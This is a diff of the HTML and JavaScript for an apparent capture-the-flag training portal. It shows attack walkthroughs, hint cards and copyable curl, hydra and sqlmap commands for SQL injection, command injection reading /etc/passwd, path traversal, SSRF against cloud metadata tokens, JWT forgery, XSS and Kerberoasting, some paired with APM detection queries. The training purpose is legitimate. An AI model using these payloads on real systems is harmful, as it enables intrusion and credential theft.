-    <div class="challenges-grid" id="ux-scenarios-grid"></div>
-    <div class="response-panel" id="ux-response-panel">
-      <div class="response-header">
-        <h3>Scenario Response</h3>
-        <div class="response-meta">
-          <span class="status-dot" id="ux-resp-dot"></span>
-          <span id="ux-resp-status"></span>
-          <span id="ux-resp-latency"></span>
-        </div>
-      </div>
-      <div class="response-body"><pre id="ux-resp-content">Click a scenario...</pre></div>
-    </div>
-  </div>
 
-  <!-- ═══ TAB: WALKTHROUGH ═══ -->
-  <div class="tab-panel" id="tab-walkthrough">
-    <div class="section-header">
-      <h2 class="section-title">CTF Walkthrough Guide</h2>
-      <span class="badge badge-ctf">Step-by-Step</span>
-    </div>
-    <p style="color:var(--text-secondary);margin-bottom:24px">Follow these guides to exploit each vulnerability. Each walkthrough shows the attack technique, curl commands, expected output, and how to find the attack in OCI APM.</p>
-
-    <!-- Guide: IDOR -->
+    <!-- Attack Surface Table -->
     <div class="guide-section">
       <div class="guide-header" onclick="toggleGuide(this)">
-        <h3><span class="badge badge-high">High</span> Mission 1: IDOR — Insecure Direct Object Reference</h3>
-        <span class="chevron">&#9660;</span>
+        <h3>&#128506; Attack Surface Map</h3>
+        <span class="chevron">&#9654;</span>
+      </div>
+      <div class="guide-body">
+        <table class="surface-table">
+          <thead>
+            <tr><th>Endpoint</th><th>Method</th><th>Vulnerability</th><th>OWASP</th><th>MITRE</th><th>Severity</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><code>/portal/api/auth/login</code></td><td>POST</td><td>Default Credentials, Brute Force</td><td>A07</td><td>T1078, T1110</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/auth/register</code></td><td>POST</td><td>Mass Assignment</td><td>A04</td><td>T1098</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/users/{id}</code></td><td>GET</td><td>IDOR</td><td>A01</td><td>T1078</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/ldap/lookup</code></td><td>GET</td><td>LDAP Injection</td><td>A03</td><td>T1190</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/treasury/search</code></td><td>GET</td><td>SQL Injection</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/messages/send</code></td><td>POST</td><td>Stored XSS</td><td>A03</td><td>T1059.007</td><td><span class="badge badge-high">High</span></td></tr>
+            <tr><td><code>/portal/api/files/download</code></td><td>GET</td><td>Path Traversal / LFI</td><td>A01</td><td>T1005</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/template/render</code></td><td>POST</td><td>SSTI</td><td>A03</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/command/exec</code></td><td>POST</td><td>Command Injection / RCE</td><td>A03</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/avatar/fetch</code></td><td>GET</td><td>SSRF</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/webhook/send</code></td><td>POST</td><td>SSRF</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/admin/panel</code></td><td>GET</td><td>JWT None Algorithm Bypass</td><td>A07</td><td>T1134</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/debug/crypto</code></td><td>GET</td><td>Credential Leak</td><td>A02</td><td>T1552</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/import/profile</code></td><td>GET</td><td>Insecure Deserialization</td><td>A08</td><td>T1059</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/portal/api/redirect</code></td><td>GET</td><td>Open Redirect</td><td>A01</td><td>T1566.002</td><td><span class="badge badge-medium">Medium</span></td></tr>
+            <tr><td><code>/portal/api/log</code></td><td>POST</td><td>Log Injection</td><td>A09</td><td>T1070</td><td><span class="badge badge-medium">Medium</span></td></tr>
+            <tr><td><code>/api/v1/got/wildlings</code></td><td>GET</td><td>SQL Injection (GOAD MSSQL)</td><td>A03</td><td>T1190</td><td><span class="badge badge-critical">Critical</span></td></tr>
+            <tr><td><code>/api/v1/got/dragons</code></td><td>GET</td><td>SSRF (GOAD Network)</td><td>A10</td><td>T1090</td><td><span class="badge badge-critical">Critical</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Methodology -->
+    <div class="guide-section">
+      <div class="guide-header" onclick="toggleGuide(this)">
+        <h3>&#128736; Pentest Methodology</h3>
+        <span class="chevron">&#9654;</span>
       </div>
       <div class="guide-body">
         <div class="guide-step">
           <div class="guide-step-num">1</div>
           <div class="guide-step-content">
-            <h4>Understand the target</h4>
-            <p>The application has an orders API that returns order details by ID. Your order is #1001, but order #1002 belongs to another user.</p>
+            <h4>Reconnaissance</h4>
+            <p>Explore the application. Check <code>/portal/api/debug/env</code> and <code>/portal/api/debug/crypto</code> for information leaks. Test the <code>/portal/api/goad/connectivity</code> endpoint to understand the network topology.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
-            <h4>Access your own order (normal behavior)</h4>
-            <div class="guide-cmd">curl -s http://CTF_TARGET/api/v1/ctf/orders/1001 | jq .</div>
-            <div class="guide-note">This returns your own order — legitimate access.</div>
+            <h4>Authentication Attacks</h4>
+            <p>Try default credentials against the login form. Attempt brute force with common passwords. Examine the JWT token structure after login — the secret may be weak.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">3</div>
           <div class="guide-step-content">
-            <h4>Change the ID to access another user's order</h4>
-            <div class="guide-cmd">curl -s http://CTF_TARGET/api/v1/ctf/orders/1002 | jq .</div>
-            <p>The server returns the order without checking ownership. Look for the flag in the response.</p>
+            <h4>Injection Testing</h4>
+            <p>Test every input field for injection vulnerabilities: SQL injection in Treasury search, LDAP injection in user lookup, command injection in System Console, SSTI in Template Renderer.</p>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-num">4</div>
           <div class="guide-step-content">
-            <h4>Detect in OCI APM</h4>
-            <div class="guide-cmd">show (spans) SpanName as Name, SpanAttribute['security.attack.type'] as AttackType where SpanAttribute['security.attack.type'] = 'idor'</div>
-            <div class="guide-note">In OCI APM Trace Explorer, this query finds all IDOR attacks. Each span includes the target user ID and source IP.</div>
+            <h4>Access Control</h4>
+            <p>Test IDOR by changing user IDs in the User Directory. Try path traversal in File Manager. Attempt to access the Admin Panel by forging JWT tokens.</p>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-num">5</div>
+          <div class="guide-step-content">
+            <h4>Server-Side Attacks</h4>
+            <p>Use Network Tools to test SSRF against internal services (GOAD VMs at 192.168.56.x, OCI metadata at 169.254.169.254). Test deserialization via Data Import.</p>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-num">6</div>
+          <div class="guide-step-content">
+            <h4>GOAD Integration</h4>
+            <p>If GOAD Active Directory is reachable, test SQL injection against the Castle Black MSSQL database. Try LDAP authentication against the three domain controllers. Explore the dragon egg tracker for SSRF against the GOAD network.</p>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- Guide: SQL Injection -->
+    <!-- Hints (Progressive Disclosure) -->
     <div class="guide-section">
       <div class="guide-header" onclick="toggleGuide(this)">
-        <h3><span class="badge badge-critical">Critical</span> SQL Injection — UNION-based Attack</h3>
-        <span class="chevron">&#9660;</span>
+        <h3>&#128161; Vulnerability Hints</h3>
+        <span class="chevron">&#9654;</span>
+      </div>
+      <div class="guide-body">
+        <div class="hints-grid">
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Authentication Bypass</h4>
+            <div class="hint-hidden">Try <code>admin</code> / <code>admin</code>. Also: the JWT secret is very short.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>SQL Injection</h4>
+            <div class="hint-hidden">Treasury search: <code>' OR 1=1--</code><br>Wildlings: <code>Tormund' UNION SELECT name,1,1 FROM sysobjects--</code></div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>IDOR</h4>
+            <div class="hint-hidden">Try user IDs 1-10. Admin is usually ID 1. Compare responses for different IDs.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Path Traversal</h4>
+            <div class="hint-hidden">Try <code>../../../etc/passwd</code> in File Manager. The app doesn't sanitize <code>../</code> sequences.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Command Injection</h4>
+            <div class="hint-hidden">System Console: <code>hostname; whoami</code> or <code>hostname | cat /etc/passwd</code></div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>SSRF</h4>
+            <div class="hint-hidden">Avatar Fetch: try <code>http://169.254.169.254/latest/meta-data/</code> or <code>http://192.168.56.10:389</code></div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>SSTI</h4>
+            <div class="hint-hidden">Template Renderer: <code>{{7*7}}</code> should return <code>49</code>. Try <code>{{config}}</code> for info leak.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>JWT Bypass</h4>
+            <div class="hint-hidden">Login first, then decode your JWT. Change <code>alg</code> to <code>none</code> and <code>role</code> to <code>admin</code>. Remove the signature.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>LDAP Injection</h4>
+            <div class="hint-hidden">LDAP Lookup: try <code>*</code> to dump all users, or <code>admin)(|(password=*</code> for filter injection.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Mass Assignment</h4>
+            <div class="hint-hidden">Registration: add <code>"role": "admin"</code> to the JSON body. The server doesn't filter extra fields.</div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>XSS</h4>
+            <div class="hint-hidden">Messages: send <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code></div>
+          </div>
+          <div class="hint-card" onclick="revealHint(this)">
+            <h4>Deserialization</h4>
+            <div class="hint-hidden">Import Profile: base64-encode a Python pickle payload with <code>__reduce__</code> method.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- curl Examples -->
+    <div class="guide-section">
+      <div class="guide-header" onclick="toggleGuide(this)">
+        <h3>&#128187; curl / CLI Examples</h3>
+        <span class="chevron">&#9654;</span>
       </div>
       <div class="guide-body">
         <div class="guide-step">
-          <div class="guide-step-num">1</div>
           <div class="guide-step-content">
-            <h4>Test for injection</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/users/search?q='" </div>
-            <p>If the server returns a SQL error, the parameter is injectable.</p>
+            <h4>Login with Default Credentials</h4>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"admin"}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
         <div class="guide-step">
-          <div class="guide-step-num">2</div>
           <div class="guide-step-content">
-            <h4>Extract data with UNION</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/users/search?q=' UNION SELECT username,password FROM users--" | jq .</div>
-            <div class="guide-warning">This dumps all usernames and password hashes from the database.</div>
+            <h4>SQL Injection — Treasury</h4>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/treasury/search?q=' OR 1=1--"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
         <div class="guide-step">
-          <div class="guide-step-num">3</div>
           <div class="guide-step-content">
-            <h4>Detect in OCI APM</h4>
-            <div class="guide-cmd">show (spans) where SpanAttribute['security.attack.type'] = 'sqli' | sort by StartTime desc</div>
-            <div class="guide-note">The OTel span includes the full SQL payload in <code>security.attack.payload</code>, the source IP, and user agent for forensics.</div>
+            <h4>SSRF — Cloud Metadata</h4>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/avatar/fetch?url=http://169.254.169.254/latest/meta-data/"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Command Injection</h4>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/command/exec \
+  -H 'Content-Type: application/json' \
+  -d '{"command":"hostname; id; cat /etc/passwd"}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Path Traversal</h4>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/files/download?path=../../../etc/passwd"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Brute Force with Hydra</h4>
+            <div class="guide-cmd">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  TARGET http-post-form \
+  "/portal/api/auth/login:username=^USER^&password=^PASS^:invalid"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>SQLMap — Treasury</h4>
+            <div class="guide-cmd">sqlmap -u "http://TARGET/portal/api/treasury/search?q=test" \
+  --level 3 --risk 2 --batch<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Nikto Scan</h4>
+            <div class="guide-cmd">nikto -h http://TARGET -root /portal/api/<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
       </div>
-    </div>
-
-    <!-- Guide: Command Injection -->
-    <div class="guide-section">
-      <div class="guide-header" onclick="toggleGuide(this)">
-        <h3><span class="badge badge-critical">Critical</span> Command Injection — Remote Code Execution</h3>
-        <span class="chevron">&#9660;</span>
-      </div>
-      <div class="guide-body">
-        <div class="guide-step">
-          <div class="guide-step-num">1</div>
-          <div class="guide-step-content">
-            <h4>Test for command injection</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id"</div>
-            <p>If the server returns the output of <code>id</code>, you have RCE.</p>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">2</div>
-          <div class="guide-step-content">
-            <h4>Chain commands</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id;whoami;cat /etc/passwd"</div>
-            <div class="guide-warning">The semicolon <code>;</code> and pipe <code>|</code> characters allow chaining multiple OS commands.</div>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">3</div>
-          <div class="guide-step-content">
-            <h4>Detect in OCI APM</h4>
-            <div class="guide-cmd">show (spans) where SpanAttribute['security.attack.type'] = 'rce' | stats count by SpanAttribute['security.source_ip']</div>
-            <div class="guide-note">Group by source IP to identify which attacker is running OS commands. The payload attribute contains the exact commands executed.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Guide: SSRF -->
-    <div class="guide-section">
-      <div class="guide-header" onclick="toggleGuide(this)">
-        <h3><span class="badge badge-critical">Critical</span> SSRF — Cloud Metadata Theft</h3>
-        <span class="chevron">&#9660;</span>
-      </div>
-      <div class="guide-body">
-        <div class="guide-step">
-          <div class="guide-step-num">1</div>
-          <div class="guide-step-content">
-            <h4>Target the cloud metadata endpoint</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/"</div>
-            <p>The IMDS endpoint at 169.254.169.254 is only accessible from within the cloud instance. SSRF lets you reach it through the application.</p>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">2</div>
-          <div class="guide-step-content">
-            <h4>Steal instance identity</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/identity/token"</div>
-            <div class="guide-warning">On OCI, this retrieves the instance principal token — equivalent to stealing the VM's IAM credentials.</div>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">3</div>
-          <div class="guide-step-content">
-            <h4>Detect in OCI APM</h4>
-            <div class="guide-cmd">show (spans) where SpanAttribute['security.attack.type'] = 'ssrf' and SpanAttribute['security.ssrf.target_url'] like '%169.254%'</div>
-            <div class="guide-note">Look for SSRF spans targeting internal/metadata IPs. The <code>security.ssrf.target_url</code> attribute reveals what the attacker tried to reach.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Guide: GOAD Kerberoasting -->
-    <div class="guide-section">
-      <div class="guide-header" onclick="toggleGuide(this)">
-        <h3><span class="badge badge-goad">GOAD</span> Kerberoasting — Active Directory Attack</h3>
-        <span class="chevron">&#9660;</span>
-      </div>
-      <div class="guide-body">
-        <div class="guide-step">
-          <div class="guide-step-num">1</div>
-          <div class="guide-step-content">
-            <h4>Understand the attack</h4>
-            <p>Kerberoasting requests TGS tickets for service accounts, then cracks them offline to reveal the service account password. This targets the GOAD AD lab (sevenkingdoms.local).</p>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">2</div>
-          <div class="guide-step-content">
-            <h4>Trigger via the portal</h4>
-            <div class="guide-cmd">curl -s "http://CTF_TARGET/portal/api/goad/kerberoast" -H "Authorization: Bearer &lt;token&gt;"</div>
-            <p>The portal sends the Kerberoast request to the GOAD domain controller and returns any captured TGS tickets.</p>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-num">3</div>
-          <div class="guide-step-content">
-            <h4>Detect in OCI APM + Windows Events</h4>
-            <div class="guide-cmd">show (spans) where SpanAttribute['security.attack.type'] = 'kerberoast'</div>
-            <div class="guide-note"><strong>APM:</strong> The OTel span records <code>security.goad.target_domain</code> and <code>security.attack.mitre_id=T1558.003</code>.<br><strong>Windows:</strong> Event ID 4769 (TGS Request) with RC4 encryption type on the domain controller.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- ═══ TAB: SCOREBOARD ═══ -->
-  <div class="tab-panel" id="tab-scoreboard">
-    <div class="section-header">
-      <h2 class="section-title">CTF Scoreboard</h2>
-      <span class="badge badge-flag" id="score-badge">0 / 10 Flags</span>
-    </div>
-    <div id="scoreboard-content">
-      <p style="color:var(--text-secondary);margin-bottom:24px">Capture flags by successfully exploiting vulnerabilities. Each flag is hidden in the server response.</p>
-      <div class="challenges-grid" id="scoreboard-grid"></div>
     </div>
   </div>
-
 </div>
 
-<!-- ── JavaScript ────────────────────────────────── -->
-<script>
-  // State
-  let totalRequests = 0, totalErrors = 0, latencies = [], flagsCaptured = new Set(), otelSpanCount = 0;
+<!-- ══════════════════════════════════════════════ -->
+<!-- APM Traces Tab                                  -->
+<!-- ══════════════════════════════════════════════ -->
+<div id="tab-traces" class="tab-panel">
+  <div class="page">
+    <div class="page-header">
+      <h1 class="page-title">APM Trace Correlation</h1>
+      <p class="page-subtitle">View OpenTelemetry traces generated by your attacks and correlate them with GOAD infrastructure logs.</p>
+    </div>
 
-  // Dynamic TARGET replacement — inject actual server URL into walkthrough commands
-  const CTF_BASE = window.location.origin;
-  document.querySelectorAll('.guide-cmd').forEach(el => {
-    el.textContent = el.textContent.replace(/http:\/\/CTF_TARGET/g, CTF_BASE);
-  });
-
-  // Challenge definitions for scoreboard and UX tab
-  const CHALLENGES = [
-    { id: 'idor', name: 'Mission 1: IDOR', category: 'A01', severity: 'high' },
-    { id: 'lfi', name: 'Mission 2: Path Traversal', category: 'A01', severity: 'critical' },
-    { id: 'ssti', name: 'Mission 3: SSTI', category: 'A03', severity: 'critical' },
-    { id: 'xss', name: 'Mission 4: Reflected XSS', category: 'A03', severity: 'high' },
-    { id: 'xxe', name: 'Mission 5: XXE Injection', category: 'A05', severity: 'critical' },
-    { id: 'deserialization', name: 'Mission 6: Deserialization', category: 'A08', severity: 'critical' },
-    { id: 'sqli', name: 'SQL Injection', category: 'A03', severity: 'critical' },
-    { id: 'rce', name: 'Command Injection (RCE)', category: 'A03', severity: 'critical' },
-    { id: 'goad-sqli', name: 'Mission 7: The Wall (MSSQL)', category: 'GOAD', severity: 'critical' },
-    { id: 'ssrf', name: 'Mission 8: Dragon Eggs (SSRF)', category: 'GOAD', severity: 'critical' },
-  ];
-
-  const UX_SCENARIOS = [
-    { endpoint: '/app/slow-query', icon: '&#128012;', name: 'Slow Database Query', desc: 'Simulates a 2-30s DB query delay. APM span exceeds the 5s threshold.', badge: 'Warning', trace: 'APM Duration' },
-    { endpoint: '/app/error-page', icon: '&#128165;', name: 'Application Error (500)', desc: 'Triggers NullPointerException. Error span with stack trace in OCI Logging.', badge: 'Error', trace: 'Error Span' },
-    { endpoint: '/app/cascade-failure', icon: '&#128279;', name: 'Cascade Failure (503)', desc: 'Upstream payment-service unavailable. Circuit breaker OPEN in trace waterfall.', badge: 'Critical', trace: 'Circuit Breaker' },
-    { endpoint: '/app/hard-load', icon: '&#128230;', name: 'Heavy Page Load (~1MB)', desc: 'Returns ~1MB HTML. RUM shows LCP >4s. Visible in APM Browser agent.', badge: 'Warning', trace: 'RUM / LCP' },
-    { endpoint: '/app/timeout', icon: '&#9201;', name: 'Request Timeout (30s+)', desc: 'Request hangs for 35 seconds. No response span — times out before completion.', badge: 'Critical', trace: 'Timeout' },
-    { endpoint: '/app/memory-pressure', icon: '&#129504;', name: 'Memory Pressure / GC Pause', desc: 'Simulates GC pause (500ms-5s) with heap at 70-95%. Observable as latency spikes.', badge: 'Warning', trace: 'GC Metrics' },
-    { endpoint: '/app/intermittent-error', icon: '&#127922;', name: 'Intermittent Error (50%)', desc: 'Random 50% failure rate. Simulates flaky upstream — hard to diagnose without tracing.', badge: 'Error', trace: 'Error Rate' },
-    { endpoint: '/app/bad-gateway', icon: '&#128683;', name: 'Bad Gateway (502)', desc: 'Upstream inventory-service returns invalid response. 502 span in APM waterfall.', badge: 'Error', trace: '502 Span' },
-  ];
-
-  // Populate UX Scenarios tab
-  (function buildUxTab() {
-    const grid = document.getElementById('ux-scenarios-grid');
-    if (!grid) return;
-    const badgeClass = { Warning: 'badge-medium', Error: 'badge-high', Critical: 'badge-critical' };
-    grid.innerHTML = UX_SCENARIOS.map(s => `
-      <div class="challenge-card" onclick="fireUxScenario('${s.endpoint}', this)">
-        <div class="card-top">
-          <span class="card-icon">${s.icon}</span>
-          <div class="card-badges"><span class="badge ${badgeClass[s.badge] || 'badge-medium'}">${s.badge}</span></div>
+    <div class="traces-layout">
+      <!-- Recent Traces -->
+      <div class="traces-list-panel">
+        <div class="section-header">
+          <h3 class="section-title">Recent Attack Traces</h3>
+          <button class="form-btn form-btn-secondary" onclick="loadTraces()">Refresh</button>
         </div>
-        <div class="card-title">${s.name}</div>
-        <div class="card-desc">${s.desc}</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET ${s.endpoint}</span>
-          <span class="card-otel">&#128269; ${s.trace}</span>
+        <div id="traces-list" class="traces-list">
+          <p class="text-muted">Click "Refresh" to load recent traces from OCI APM, or interact with the Practice Lab to generate traces.</p>
         </div>
       </div>
-    `).join('');
-  })();
 
-  // Track which challenge IDs have been solved
-  const solvedChallenges = new Set();
+      <!-- Trace Details -->
+      <div class="trace-detail-panel">
+        <div class="section-header">
+          <h3 class="section-title">Trace Details</h3>
+        </div>
+        <div id="trace-detail" class="trace-detail">
+          <p class="text-muted">Select a trace from the list to view span details and correlated logs.</p>
+        </div>
+      </div>
+    </div>
 
-  // Populate Scoreboard tab
-  function renderScoreboard() {
-    const grid = document.getElementById('scoreboard-grid');
-    if (!grid) return;
-    const badgeClass = { high: 'badge-high', critical: 'badge-critical', medium: 'badge-medium' };
-    grid.innerHTML = CHALLENGES.map(c => {
-      const solved = solvedChallenges.has(c.id);
-      return `
-        <div class="challenge-card${solved ? ' solved' : ''}" style="cursor:default">
-          <div class="card-top">
-            <span class="card-icon">${solved ? '&#9989;' : '&#128274;'}</span>
-            <div class="card-badges">
-              <span class="badge ${badgeClass[c.severity] || 'badge-medium'}">${c.severity}</span>
-              <span class="badge badge-ctf">${c.category}</span>
-            </div>
-          </div>
-          <div class="card-title">${c.name}</div>
-          <div class="card-footer">
-            <span class="card-endpoint">${c.id}</span>
-            <span class="card-otel">${solved ? '&#127937; Captured' : '&#128274; Locked'}</span>
-          </div>
-        </div>`;
-    }).join('');
-  }
-  renderScoreboard();
+    <!-- Detection Rules -->
+    <div class="guide-section" style="margin-top:24px;">
+      <div class="guide-header" onclick="toggleGuide(this)">
+        <h3>&#128270; APM Detection Rules</h3>
+        <span class="chevron">&#9654;</span>
+      </div>
+      <div class="guide-body">
+        <div id="detection-rules-list">
+          <p class="text-muted">Loading detection rules...</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 
-  // Tab switching
-  document.querySelectorAll('.nav-links a').forEach(link => {
-    link.addEventListener('click', e => {
+<!-- ══════════════════════════════════════════════ -->
+<!-- JavaScript                                      -->
+<!-- ══════════════════════════════════════════════ -->
+<script>
+(function() {
+  "use strict";
+
+  // ── State ──────────────────────────────────────
+  let sessionToken = null;
+  const requestHistory = [];
+
+  // ── Tab Navigation ─────────────────────────────
+  document.querySelectorAll(".topnav .nav-links a").forEach(function(link) {
+    link.addEventListener("click", function(e) {
       e.preventDefault();
-      const tab = link.dataset.tab;
-      document.querySelectorAll('.nav-links a').forEach(l => l.classList.remove('active'));
-      link.classList.add('active');
-      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
-      document.getElementById('tab-' + tab).classList.add('active');
-      if (tab === 'scoreboard') renderScoreboard();
+      var tab = this.getAttribute("data-tab");
+      document.querySelectorAll(".tab-panel").forEach(function(p) { p.classList.remove("active"); });
+      document.querySelectorAll(".nav-links a").forEach(function(a) { a.classList.remove("active"); });
+      document.getElementById("tab-" + tab).classList.add("active");
+      this.classList.add("active");
     });
   });
 
-  // Fire a challenge (GET)
-  async function fireChallenge(url, cardEl, challengeId) {
-    const panel = document.getElementById('response-panel');
-    const content = document.getElementById('resp-content');
-    const status = document.getElementById('resp-status');
-    const lat = document.getElementById('resp-latency');
-    const dot = document.getElementById('resp-dot');
-    const flagBanner = document.getElementById('flag-banner');
+  // ── Form Submission Handler ────────────────────
+  document.querySelectorAll("form.lab-form").forEach(function(form) {
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      submitLabForm(this);
+    });
+  });
 
-    cardEl.classList.add('loading');
-    panel.classList.add('visible');
-    content.textContent = 'Loading...';
-    flagBanner.style.display = 'none';
+  function submitLabForm(form) {
+    var method = form.getAttribute("data-method") || "GET";
+    var urlTemplate = form.getAttribute("data-url-template");
+    var url = form.getAttribute("data-url");
+    var contentType = form.getAttribute("data-content");
+    var useAuth = form.getAttribute("data-auth");
+    var noFollow = form.getAttribute("data-follow") === "false";
 
-    const start = performance.now();
-    totalRequests++;
-    otelSpanCount++;
-    updateMetrics();
+    // Build URL from template if present
+    if (urlTemplate) {
+      url = urlTemplate;
+      var inputs = form.querySelectorAll("input, select, textarea");
+      inputs.forEach(function(inp) {
+        var placeholder = "{" + inp.name + "}";
+        if (url.indexOf(placeholder) !== -1) {
+          url = url.replace(placeholder, encodeURIComponent(inp.value));
+        }
+      });
+    }
 
-    try {
-      const resp = await fetch(url);
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      const text = await resp.text();
+    // Build request options
+    var opts = { method: method, headers: {} };
 
-      let formatted;
-      try { formatted = JSON.stringify(JSON.parse(text), null, 2); }
-      catch { formatted = text.substring(0, 3000) + (text.length > 3000 ? '\n... (truncated)' : ''); }
+    if (method === "POST" && contentType === "json") {
+      var body = {};
+      var inputs = form.querySelectorAll("input, select, textarea");
+      inputs.forEach(function(inp) {
+        if (inp.name && inp.name.charAt(0) !== "_") {
+          body[inp.name] = inp.value;
+        }
+      });
+      opts.headers["Content-Type"] = "application/json";
+      opts.body = JSON.stringify(body);
+    }
 
-      status.textContent = 'HTTP ' + resp.status;
-      lat.textContent = elapsed + 'ms';
-      content.textContent = formatted;
-      dot.className = resp.ok ? 'status-dot ok' : 'status-dot err';
-      if (!resp.ok) totalErrors++;
-
-      // Flag detection
-      const flagMatch = text.match(/FLAG\{[^}]+\}/);
-      if (flagMatch && !flagsCaptured.has(flagMatch[0])) {
-        flagsCaptured.add(flagMatch[0]);
-        solvedChallenges.add(challengeId);
-        flagBanner.textContent = flagMatch[0];
-        flagBanner.style.display = 'block';
-        cardEl.classList.add('solved');
-        document.getElementById('flags-captured').textContent = flagsCaptured.size;
-        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 10 Flags';
+    // JWT auth
+    if (useAuth === "jwt") {
+      var jwtOverride = form.querySelector('input[name="_jwt_override"]');
+      var token = (jwtOverride && jwtOverride.value) ? jwtOverride.value : sessionToken;
+      if (token) {
+        opts.headers["Authorization"] = "Bearer " + token;
       }
-    } catch (err) {
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      status.textContent = 'FAILED';
-      lat.textContent = elapsed + 'ms';
-      content.textContent = err.message;
-      dot.className = 'status-dot err';
-      totalErrors++;
+    } else if (sessionToken) {
+      opts.headers["Authorization"] = "Bearer " + sessionToken;
     }
 
-    cardEl.classList.remove('loading');
-    updateMetrics();
+    // Redirect handling
+    if (noFollow) {
+      opts.redirect = "manual";
+    }
+
+    // Submit
+    var startTime = performance.now();
+    showLoading(method, url);
+
+    fetch(url, opts)
+      .then(function(resp) {
+        var elapsed = Math.round(performance.now() - startTime);
+        return resp.text().then(function(text) {
